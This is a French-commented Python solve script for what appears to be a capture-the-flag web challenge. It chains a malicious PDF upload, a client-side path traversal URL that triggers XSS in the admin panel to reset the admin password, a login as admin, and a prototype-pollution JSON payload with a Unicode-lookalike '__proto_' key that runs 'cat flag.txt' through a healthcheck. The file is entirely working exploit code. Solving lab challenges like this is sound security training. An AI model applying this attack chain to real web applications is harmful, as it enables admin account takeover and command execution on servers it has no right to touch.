import requests
from pdf_generation import generateMaliciousPdf
from bs4 import BeautifulSoup
import sys
from time import sleep

s = requests.session()


def registerAndLogin(base_url: str):
    """
    Inscrit un nouvel utilisateur (username: user, password: password) et se connecte.
    """
    data = {"username": "user", "password": "password"}
    # Inscription
    r = s.post(f"{base_url}/register", data=data)
    # Connexion
    r = s.post(f"{base_url}/login", data=data)
    print("[*] Utilisateur 'user' enregistré et connecté.")


def uploadMaliciousPdf(base_url: str):
    """
    Génère et envoie un PDF malicieux via le champ 'cv'.
    """
    file_obj = generateMaliciousPdf()
    files = {"cv": ("malicious.pdf", file_obj, "application/pdf")}
    r = s.post(f"{base_url}/cv/upload", files=files)
    print("[*] PDF malicieux uploadé")


def get_cv_id(session: requests.Session, base_url: str) -> str:
    """
    Récupère l'ID du CV depuis la page /profile.
    On suppose que la page contient un élément <object> dont l'attribut 'data' est au format "/cv/<cv_id>".
    """
    url = f"{base_url}/profile"
    response = session.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    obj = soup.find("object")
    if obj and "data" in obj.attrs:
        data_attr = obj["data"]
        parts = data_attr.strip("/").split("/")
        if len(parts) >= 2 and parts[0] == "cv":
            return parts[1]
    return None


def get_admin_id(session: requests.Session, base_url: str) -> str:
    """
    Récupère l'ID de l'administrateur depuis la page /home en cherchant un bloc 'post-header'
    contenant un <strong> dont le texte est "admin". On extrait ensuite l'ID depuis le lien associé.
    """
    url = f"{base_url}/home"
    response = session.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    for header in soup.find_all("div", class_="post-header"):
        strong = header.find("strong")
        if strong and strong.get_text(strip=True).lower() == "admin":
            a = header.find("a", href=True)
            if a:
                href = a["href"]
                parts = href.strip("/").split("/")
                if len(parts) >= 2 and parts[0] == "user":
                    return parts[1]
    return None


def sendXSSToAdmin(base_url: str):
    """
    Envoie une requête GET pour signaler l'administrateur en utilisant une URL de type
    /user/report/<admin_id>/<payload>, ici construite avec le CV ID injecté dans l'URL.
    L'URL est construite de manière à exploiter la vulnérabilité via prototype pollution.
    """
    cv_id = get_cv_id(s, base_url)
    admin_id = get_admin_id(s, base_url)
    if not cv_id or not admin_id:
        print("Erreur : Impossible de récupérer l'ID du CV ou de l'admin.")
        sys.exit(1)
    # CSPT dans l'URL de report
    report_url = f"{base_url}/user/report/{admin_id}%2f..%2f..%2fcv%2f{cv_id}"
    r = s.get(report_url)
    print("[*] Envoi de la requête XSS au panel admin")


def loginAsAdmin(base_url: str):
    """
    Se connecte en tant qu'administrateur (username: admin, password: pwned!).
    """
    data = {"username": "admin", "password": "pwned!"}
    r = s.post(f"{base_url}/login", data=data)
    print("[*] Connecté en tant qu'administrateur.")


def polluteAndGetFlag(base_url: str):
    """
    Envoie un payload JSON pour polluer la configuration de l'admin,
    puis récupère la page du dashboard admin pour tenter d'exécuter le healthcheck (qui doit
    afficher le flag dans les logs ou dans le rendu).
    """
    # Payload de prototype pollution
    payload = {"debug": True, "__proto_\uff3f": {"debugHealthcheck": "cat flag.txt"}}
    r = s.post(f"{base_url}/admin/dashboard/config", json=payload)
    print("[*] Mise à jour de la configuration")
    r = s.get(f"{base_url}/admin/dashboard")
    soup = BeautifulSoup(r.text, "html.parser")
    healthcheck_div = soup.find("div", class_="healthcheck")
    print(
        "[*] Résultat du healthcheck :",
        healthcheck_div.get_text() if healthcheck_div else "Aucun résultat.",
    )


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Error: No URL provided.")
        print("Usage: python solve.py <url>")
        sys.exit(1)

    # Get the URL from the argument
    remote_url = sys.argv[1]

    base_url = remote_url.rstrip("/")

    # Étape 1 : Enregistrement et connexion en tant qu'utilisateur classique
    registerAndLogin(base_url)

    # Étape 2 : Upload du PDF malicieux
    uploadMaliciousPdf(base_url)

    # Étape 3 : Envoyer la requête de reporting via CSPT à l'admin pour le XSS
    sendXSSToAdmin(base_url)

    # Étape 4 : Se déconnecter en tant qu'utilisateur courant
    s.get(f"{base_url}/logout")
    sleep(10)

    # Étape 5 : Se connecter en tant qu'administrateur avec le mot de passe qu'on a set via XSS
    loginAsAdmin(base_url)

    # Étape 6 : Récupérer le flag via la prototype pollution dans le healthcheck
    polluteAndGetFlag(base_url)
